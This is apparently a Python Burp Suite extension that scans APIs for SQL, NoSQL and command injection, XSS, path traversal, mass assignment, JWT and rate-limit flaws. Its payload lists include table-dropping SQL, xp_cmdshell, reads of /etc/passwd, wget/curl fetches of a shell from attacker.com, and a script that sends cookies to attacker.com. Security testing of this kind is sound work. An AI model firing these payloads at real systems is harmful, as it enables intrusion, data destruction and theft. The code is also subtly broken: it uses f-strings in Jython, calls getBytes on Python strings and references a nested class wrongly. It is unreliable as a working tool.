#!/usr/bin/env python3
"""
API Security Scanner Extension for Burp Suite
Comprehensive API security testing with various attack vectors
"""

import json
import base64
import hashlib
import hmac
import time
import random
import string
import re
from urllib.parse import urlparse, parse_qs, urlencode
from burp import IBurpExtender, IScannerCheck, IScanIssue, IHttpRequestResponse, IHttpService
from java.io import PrintWriter
from java.util import List, ArrayList

class APISecurityScanner(IBurpExtender, IScannerCheck):
    """Comprehensive API security scanner extension"""
    
    def __init__(self):
        self.callbacks = None
        self.helpers = None
        self.stdout = None
        self.stderr = None
        
        # API security test payloads
        self.auth_bypass_payloads = [
            "null", "undefined", "test", "admin", "123456", "api_key", "key",
            "Bearer null", "Bearer undefined", "Bearer test", "Bearer admin",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0."
        ]
        
        self.sql_injection_payloads = [
            "' OR '1'='1", "' OR 1=1--", "'; DROP TABLE users--",
            "' UNION SELECT NULL--", "admin'--", "1' AND '1'='1",
            "' UNION SELECT username,password FROM users--",
            "' OR 1=1 LIMIT 1--", "' OR 'x'='x", "'; EXEC xp_cmdshell('dir')--"
        ]
        
        self.xss_payloads = [
            "<script>alert('XSS')</script>", "<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')", "<svg onload=alert('XSS')>",
            "'><script>alert('XSS')</script>", "<iframe src=javascript:alert('XSS')>",
            "';alert('XSS');//", "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>"
        ]
        
        self.no_sql_injection_payloads = [
            '{"$gt": ""}', '{"$ne": null}', '{"$where": "1==1"}',
            '{"$regex": ".*"}', '{"$exists": true}', '{"$in": ["admin"]}',
            '{"$or": [{"admin": true}]}', '{"$and": [{"admin": true}]}'
        ]
        
        self.command_injection_payloads = [
            "; ls -la", "| ls", "& dir", "`whoami`", "$(id)",
            "; cat /etc/passwd", "| cat /etc/passwd", "& type C:\\windows\\system32\\drivers\\etc\\hosts",
            "; wget http://attacker.com/shell", "| curl http://attacker.com/shell"
        ]
        
        self.path_traversal_payloads = [
            "../../../etc/passwd", "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
            "....//....//....//etc/passwd", "..%2F..%2F..%2Fetc%2Fpasswd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd", "..%252F..%252F..%252Fetc%252Fpasswd"
        ]
        
        self.mass_assignment_payloads = [
            {"role": "admin"}, {"is_admin": True}, {"admin": True},
            {"isAdmin": True}, {"user_role": "admin"}, {"role_id": 1},
            {"roleId": 1}, {"permissions": ["admin", "user"]},
            {"access_level": "admin"}, {"accessLevel": "admin"},
            {"active": True}, {"enabled": True}, {"verified": True},
            {"email_verified": True}, {"emailVerified": True},
            {"status": "active"}, {"account_status": "active"},
            {"is_superuser": True}, {"isSuperuser": True},
            {"superuser": True}, {"privileges": ["read", "write", "admin"]},
            {"capabilities": ["admin"]}, {"premium": True},
            {"is_premium": True}, {"subscription": "premium"},
            {"plan": "premium"}, {"billing_tier": "premium"},
            {"payment_status": "paid"}, {"id": 1}, {"user_id": 1},
            {"userId": 1}, {"account_id": 1}, {"accountId": 1}
        ]
        
        self.jwt_attack_payloads = [
            # None algorithm
            "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsImlhdCI6MTYxNjE2MjAwMCwiZXhwIjoxNjE2MTY1NjAwfQ.",
            # Empty signature
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.",
            # Weak secret
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiJ9.weak_secret",
            # Modified payload
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9.signature"
        ]
        
        self.rate_limiting_bypass_headers = [
            {"X-Forwarded-For": "127.0.0.1"},
            {"X-Real-IP": "127.0.0.1"},
            {"X-Originating-IP": "127.0.0.1"},
            {"X-Remote-IP": "127.0.0.1"},
            {"X-Remote-Addr": "127.0.0.1"},
            {"X-Client-IP": "127.0.0.1"},
            {"CF-Connecting-IP": "127.0.0.1"},
            {"True-Client-IP": "127.0.0.1"},
            {"X-Forwarded-For": "192.168.1.1"},
            {"X-Forwarded-For": "10.0.0.1"},
            {"User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"},
            {"User-Agent": "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)"},
            {"User-Agent": "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)"},
            {"X-Requested-With": "XMLHttpRequest"},
            {"X-Requested-With": "Fetch"},
            {"Accept": "application/json"},
            {"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"}
        ]

    def registerExtenderCallbacks(self, callbacks):
        """Register the extension with Burp Suite"""
        self.callbacks = callbacks
        self.helpers = callbacks.getHelpers()
        self.stdout = PrintWriter(callbacks.getStdout(), True)
        self.stderr = PrintWriter(callbacks.getStderr(), True)
        
        # Set extension name
        callbacks.setExtensionName("API Security Scanner")
        
        # Register scanner check
        callbacks.registerScannerCheck(self)
        
        self.stdout.println("API Security Scanner loaded successfully!")

    def doPassiveScan(self, baseRequestResponse):
        """Perform passive scanning for API security issues"""
        issues = ArrayList()
        
        # Get request and response
        requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
        responseInfo = self.helpers.analyzeResponse(baseRequestResponse.getResponse())
        
        # Check for API endpoints
        if self.isAPIEndpoint(requestInfo.getUrl().getPath()):
            # Check for sensitive information exposure
            self.checkSensitiveInfoExposure(baseRequestResponse, responseInfo, issues)
            
            # Check for missing security headers
            self.checkMissingSecurityHeaders(baseRequestResponse, responseInfo, issues)
            
            # Check for API version information disclosure
            self.checkAPIVersionDisclosure(baseRequestResponse, responseInfo, issues)
            
            # Check for error information disclosure
            self.checkErrorInformationDisclosure(baseRequestResponse, responseInfo, issues)
        
        return issues

    def doActiveScan(self, baseRequestResponse, insertionPoint):
        """Perform active scanning for API security issues"""
        issues = ArrayList()
        
        # Get request info
        requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
        
        # Check if this is an API endpoint
        if self.isAPIEndpoint(requestInfo.getUrl().getPath()):
            # Test authentication bypass
            self.testAuthenticationBypass(baseRequestResponse, insertionPoint, issues)
            
            # Test SQL injection
            self.testSQLInjection(baseRequestResponse, insertionPoint, issues)
            
            # Test XSS
            self.testXSS(baseRequestResponse, insertionPoint, issues)
            
            # Test NoSQL injection
            self.testNoSQLInjection(baseRequestResponse, insertionPoint, issues)
            
            # Test command injection
            self.testCommandInjection(baseRequestResponse, insertionPoint, issues)
            
            # Test path traversal
            self.testPathTraversal(baseRequestResponse, insertionPoint, issues)
            
            # Test mass assignment
            self.testMassAssignment(baseRequestResponse, insertionPoint, issues)
            
            # Test JWT attacks
            self.testJWTAttacks(baseRequestResponse, insertionPoint, issues)
            
            # Test rate limiting bypass
            self.testRateLimitingBypass(baseRequestResponse, insertionPoint, issues)
        
        return issues

    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        """Consolidate duplicate issues"""
        if newIssue.getSeverity().equals("High") and not existingIssue.getSeverity().equals("High"):
            return -1
        elif existingIssue.getSeverity().equals("High") and not newIssue.getSeverity().equals("High"):
            return 1
        return 0

    def isAPIEndpoint(self, path):
        """Check if the path is an API endpoint"""
        api_patterns = ["/api/", "/rest/", "/v1/", "/v2/", "/graphql", "/swagger", "/openapi"]
        path_lower = path.lower()
        return any(pattern in path_lower for pattern in api_patterns)

    def checkSensitiveInfoExposure(self, baseRequestResponse, responseInfo, issues):
        """Check for sensitive information exposure in API responses"""
        responseBody = self.helpers.bytesToString(baseRequestResponse.getResponse())
        
        # Check for sensitive patterns
        sensitive_patterns = [
            "password", "api_key", "secret", "token", "private_key",
            "credit_card", "ssn", "social_security", "jwt", "bearer",
            "access_token", "refresh_token", "client_secret"
        ]
        
        for pattern in sensitive_patterns:
            if pattern.lower() in responseBody.lower():
                issues.add(APISecurityIssue(
                    baseRequestResponse,
                    "API Sensitive Information Exposure",
                    f"Response contains potential sensitive information: {pattern}",
                    "High"
                ))

    def checkMissingSecurityHeaders(self, baseRequestResponse, responseInfo, issues):
        """Check for missing security headers in API responses"""
        headers = responseInfo.getHeaders()
        
        # Check for security headers
        security_headers = {
            "Strict-Transport-Security": "Missing HSTS header",
            "Content-Security-Policy": "Missing CSP header",
            "X-Frame-Options": "Missing X-Frame-Options header",
            "X-Content-Type-Options": "Missing X-Content-Type-Options header",
            "X-XSS-Protection": "Missing X-XSS-Protection header",
            "Referrer-Policy": "Missing Referrer-Policy header"
        }
        
        for header_name, message in security_headers.items():
            if not any(header.lower().startswith(header_name.lower() + ":") for header in headers):
                issues.add(APISecurityIssue(
                    baseRequestResponse,
                    "Missing Security Header",
                    message,
                    "Medium"
                ))

    def checkAPIVersionDisclosure(self, baseRequestResponse, responseInfo, issues):
        """Check for API version information disclosure"""
        responseBody = self.helpers.bytesToString(baseRequestResponse.getResponse())
        
        # Check for version information
        version_patterns = [
            r'"version":\s*"[^"]*"',
            r'"api_version":\s*"[^"]*"',
            r'"swagger":\s*"[^"]*"',
            r'"openapi":\s*"[^"]*"'
        ]
        
        for pattern in version_patterns:
            if re.search(pattern, responseBody, re.IGNORECASE):
                issues.add(APISecurityIssue(
                    baseRequestResponse,
                    "API Version Information Disclosure",
                    "API version information exposed in response",
                    "Low"
                ))

    def checkErrorInformationDisclosure(self, baseRequestResponse, responseInfo, issues):
        """Check for error information disclosure"""
        responseBody = self.helpers.bytesToString(baseRequestResponse.getResponse())
        
        # Check for error information
        error_patterns = [
            "stack trace", "exception", "error", "debug", "traceback",
            "sql error", "database error", "internal error"
        ]
        
        for pattern in error_patterns:
            if pattern.lower() in responseBody.lower():
                issues.add(APISecurityIssue(
                    baseRequestResponse,
                    "API Error Information Disclosure",
                    f"Error information exposed: {pattern}",
                    "Medium"
                ))

    def testAuthenticationBypass(self, baseRequestResponse, insertionPoint, issues):
        """Test for authentication bypass vulnerabilities"""
        for payload in self.auth_bypass_payloads:
            # Test in headers
            modifiedRequest = self.createRequestWithHeader(baseRequestResponse, "Authorization", payload)
            response = self.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), modifiedRequest)
            
            if self.isSuccessfulResponse(response):
                issues.add(APISecurityIssue(
                    response,
                    "API Authentication Bypass",
                    f"Authentication bypassed with payload: {payload}",
                    "High"
                ))

    def testSQLInjection(self, baseRequestResponse, insertionPoint, issues):
        """Test for SQL injection vulnerabilities"""
        for payload in self.sql_injection_payloads:
            modifiedRequest = insertionPoint.buildRequest(payload.getBytes())
            response = self.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), modifiedRequest)
            
            responseBody = self.helpers.bytesToString(response.getResponse())
            
            # Check for SQL error messages
            if any(error in responseBody.lower() for error in ["sql", "mysql", "oracle", "sql server", "postgresql"]):
                issues.add(APISecurityIssue(
                    response,
                    "API SQL Injection",
                    f"SQL injection detected with payload: {payload}",
                    "High"
                ))

    def testXSS(self, baseRequestResponse, insertionPoint, issues):
        """Test for XSS vulnerabilities"""
        for payload in self.xss_payloads:
            modifiedRequest = insertionPoint.buildRequest(payload.getBytes())
            response = self.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), modifiedRequest)
            
            responseBody = self.helpers.bytesToString(response.getResponse())
            
            # Check if payload is reflected
            if payload in responseBody:
                issues.add(APISecurityIssue(
                    response,
                    "API XSS Vulnerability",
                    f"XSS vulnerability detected with payload: {payload}",
                    "High"
                ))

    def testNoSQLInjection(self, baseRequestResponse, insertionPoint, issues):
        """Test for NoSQL injection vulnerabilities"""
        for payload in self.no_sql_injection_payloads:
            try:
                payload_obj = json.loads(payload)
                modifiedRequest = insertionPoint.buildRequest(json.dumps(payload_obj).getBytes())
                response = self.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), modifiedRequest)
                
                responseBody = self.helpers.bytesToString(response.getResponse())
                
                # Check for NoSQL error messages
                if any(error in responseBody.lower() for error in ["mongodb", "mongo", "nosql", "bson"]):
                    issues.add(APISecurityIssue(
                        response,
                        "API NoSQL Injection",
                        f"NoSQL injection detected with payload: {payload}",
                        "High"
                    ))
            except json.JSONDecodeError:
                continue

    def testCommandInjection(self, baseRequestResponse, insertionPoint, issues):
        """Test for command injection vulnerabilities"""
        for payload in self.command_injection_payloads:
            modifiedRequest = insertionPoint.buildRequest(payload.getBytes())
            response = self.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), modifiedRequest)
            
            responseBody = self.helpers.bytesToString(response.getResponse())
            
            # Check for command execution indicators
            if any(indicator in responseBody.lower() for indicator in ["root:", "uid=", "gid=", "groups="]):
                issues.add(APISecurityIssue(
                    response,
                    "API Command Injection",
                    f"Command injection detected with payload: {payload}",
                    "High"
                ))

    def testPathTraversal(self, baseRequestResponse, insertionPoint, issues):
        """Test for path traversal vulnerabilities"""
        for payload in self.path_traversal_payloads:
            modifiedRequest = insertionPoint.buildRequest(payload.getBytes())
            response = self.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), modifiedRequest)
            
            responseBody = self.helpers.bytesToString(response.getResponse())
            
            # Check for path traversal indicators
            if any(indicator in responseBody.lower() for indicator in ["root:", "bin:", "etc:", "passwd:", "shadow:"]):
                issues.add(APISecurityIssue(
                    response,
                    "API Path Traversal",
                    f"Path traversal detected with payload: {payload}",
                    "High"
                ))

    def testMassAssignment(self, baseRequestResponse, insertionPoint, issues):
        """Test for mass assignment vulnerabilities"""
        for payload in self.mass_assignment_payloads:
            modifiedRequest = insertionPoint.buildRequest(json.dumps(payload).getBytes())
            response = self.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), modifiedRequest)
            
            if self.isSuccessfulResponse(response):
                responseBody = self.helpers.bytesToString(response.getResponse())
                
                # Check if assigned values appear in response
                for key, value in payload.items():
                    if str(value) in responseBody:
                        issues.add(APISecurityIssue(
                            response,
                            "API Mass Assignment",
                            f"Mass assignment detected with payload: {key}={value}",
                            "High"
                        ))

    def testJWTAttacks(self, baseRequestResponse, insertionPoint, issues):
        """Test for JWT token vulnerabilities"""
        for payload in self.jwt_attack_payloads:
            modifiedRequest = self.createRequestWithHeader(baseRequestResponse, "Authorization", f"Bearer {payload}")
            response = self.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), modifiedRequest)
            
            if self.isSuccessfulResponse(response):
                issues.add(APISecurityIssue(
                    response,
                    "API JWT Vulnerability",
                    f"JWT vulnerability detected with payload: {payload}",
                    "High"
                ))

    def testRateLimitingBypass(self, baseRequestResponse, insertionPoint, issues):
        """Test for rate limiting bypass vulnerabilities"""
        # First, trigger rate limiting
        rapid_requests = []
        for i in range(50):
            rapid_requests.append(self.callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), baseRequestResponse.getRequest()))
        
        # Check if any requests succeeded despite rate limiting
        success_count = sum(1 for response in rapid_requests if self.isSuccessfulResponse(response))
        
        if success_count > 40:  # More than 80% succeeded
            issues.add(APISecurityIssue(
                baseRequestResponse,
                "API Rate Limiting Bypass",
                f"Rate limiting bypassed: {success_count}/50 requests succeeded",
                "Medium"
            ))

    def createRequestWithHeader(self, baseRequestResponse, headerName, headerValue):
        """Create a request with a modified header"""
        requestInfo = self.helpers.analyzeRequest(baseRequestResponse)
        headers = list(requestInfo.getHeaders())
        
        # Find and replace existing header or add new one
        header_found = False
        for i, header in enumerate(headers):
            if header.lower().startswith(headerName.lower() + ":"):
                headers[i] = f"{headerName}: {headerValue}"
                header_found = True
                break
        
        if not header_found:
            headers.append(f"{headerName}: {headerValue}")
        
        return self.helpers.buildHttpMessage(headers, baseRequestResponse.getRequest()[requestInfo.getBodyOffset():])

    def isSuccessfulResponse(self, response):
        """Check if response indicates successful request"""
        responseInfo = self.helpers.analyzeResponse(response.getResponse())
        status = responseInfo.getStatusCode()
        return 200 <= status < 300

    class APISecurityIssue(IScanIssue):
        """Custom scan issue for API security vulnerabilities"""
        
        def __init__(self, requestResponse, name, detail, severity):
            self.requestResponse = requestResponse
            self.name = name
            self.detail = detail
            self.severity = severity
        
        def getUrl(self):
            return self.requestResponse.getUrl().toString()
        
        def getIssueName(self):
            return self.name
        
        def getIssueType(self):
            return 0
        
        def getSeverity(self):
            return self.severity
        
        def getConfidence(self):
            return "Certain"
        
        def getIssueBackground(self):
            return "This issue was detected by the API Security Scanner extension."
        
        def getRemediationBackground(self):
            return "Review the API implementation and implement appropriate security measures."
        
        def getIssueDetail(self):
            return self.detail
        
        def getRemediationDetail(self):
            return "Implement proper input validation, authentication, and authorization controls."
        
        def getHttpMessages(self):
            return [self.requestResponse]
        
        def getHttpService(self):
            return self.requestResponse.getHttpService()


# Register the extension
if __name__ == "__main__":
    print("API Security Scanner Extension")
    print("This extension performs comprehensive API security testing")
    print("Load this extension in Burp Suite's Extensions tab") 